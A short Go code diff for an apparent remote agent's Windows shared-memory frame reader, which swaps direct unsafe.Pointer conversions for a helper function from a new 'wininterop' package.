@@ -10,6 +10,8 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"overlord-client/cmd/agent/wininterop"
 )
 
 // backstageFrameHeader mirrors the C backstageFrameHeader struct.
@@ -106,7 +108,7 @@ func backstageGetFrameReader(pid uint32) *backstageFrameReader {
 		return nil
 	}
 
-	hdr := (*backstageFrameHeader)(unsafe.Pointer(view))
+	hdr := (*backstageFrameHeader)(wininterop.Pointer(view))
 	if hdr.Magic != backstageFrameMagic {
 		procUnmapViewOfFile.Call(view)
 		procCloseHandle.Call(shmHandle)
@@ -130,7 +132,7 @@ func backstageGetFrameReader(pid uint32) *backstageFrameReader {
 		return nil
 	}
 
-	hdr2 := (*backstageFrameHeader)(unsafe.Pointer(fullView))
+	hdr2 := (*backstageFrameHeader)(wininterop.Pointer(fullView))
 
 	evtName, _ := syscall.UTF16PtrFromString(fmt.Sprintf("%s%d", backstageEventPrefix, pid))
 	evtHandle, _, _ := procOpenEventW.Call(
@@ -142,7 +144,7 @@ func backstageGetFrameReader(pid uint32) *backstageFrameReader {
 	r := &backstageFrameReader{
 		pid:       pid,
 		shmHandle: shmHandle,
-		shmView:   unsafe.Pointer(fullView),
+		shmView:   wininterop.Pointer(fullView),
 		shmSize:   fullSize,
 		evtHandle: evtHandle,
 	}
@@ -233,7 +235,7 @@ func (r *backstageFrameReader) remap(w, h, stride int) {
 	if view == 0 {
 		return
 	}
-	r.shmView = unsafe.Pointer(view)
+	r.shmView = wininterop.Pointer(view)
 	r.shmSize = newSize
 }
 
